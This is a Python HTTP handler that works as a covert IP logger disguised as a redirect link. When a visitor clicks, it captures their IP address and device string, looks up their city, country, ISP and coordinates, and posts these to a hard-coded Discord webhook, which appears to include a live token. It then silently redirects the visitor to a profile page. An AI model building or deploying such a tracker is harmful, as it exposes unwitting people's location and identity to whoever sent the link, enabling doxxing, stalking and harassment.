from http.server import BaseHTTPRequestHandler
import requests
import json

# 1. PASTE YOUR WEBHOOK URL INSIDE THE QUOTES
WEBHOOK_URL = "https://discord.com/api/webhooks/1471709365064171624/1Do6JPAWJ-EQ5RipNP9bIGrX2lcTv0rdNs7O-Mi2iTYsS96UTiW9fL40Rd0CHpdpvitW"
REDIRECT_URL = "https://guns.lol/sleezyyyyyy"

class handler(BaseHTTPRequestHandler):
    def do_GET(self):
        ua = self.headers.get('User-Agent', '')
        ip = self.headers.get('x-forwarded-for', self.client_address[0]).split(',')[0]
        
        # Check if it's the Discord Bot for the "Link Sent" alert
        is_bot = "Discordbot" in ua or "TelegramBot" in ua
        
        # Get location data
        try:
            geo = requests.get(f"http://ip-api.com/json/{ip}", timeout=3).json()
            city = geo.get('city', 'Unknown')
            country = geo.get('country', 'Unknown')
            isp = geo.get('isp', 'Unknown')
            coords = f"{geo.get('lat', '0')}, {geo.get('lon', '0')}"
        except:
            city = country = isp = coords = "Unknown"

        # Match the titles from your screenshots
        if is_bot:
            title = "📤 Image Logger - Link Sent"
            color = 3447003 # Blue
            desc = "An **Image Logging** link was sent in a chat!\nYou may receive an IP soon."
        else:
            title = "🎯 New Visitor Located!"
            color = 16711680 # Red
            desc = "A user clicked your redirect link!"

        payload = {
            "embeds": [{
                "title": title,
                "description": desc,
                "color": color,
                "fields": [
                    {"name": "🌐 IP Address", "value": f"`{ip}`", "inline": True},
                    {"name": "📍 Location", "value": f"{city}, {country}", "inline": True},
                    {"name": "🏢 Provider/ISP", "value": isp, "inline": False},
                    {"name": "🗺️ Coordinates", "value": coords, "inline": False},
                    {"name": "📱 Device", "value": f"```{ua[:150]}```", "inline": False}
                ],
                "footer": {"text": "Guns.lol Logger | Endpoint: /api"}
            }]
        }

        # Send to Discord
        try:
            requests.post(WEBHOOK_URL, json=payload, timeout=5)
        except:
            pass

        # Redirect the user
        self.send_response(302)
        self.send_header('Location', REDIRECT_URL)
        self.end_headers()
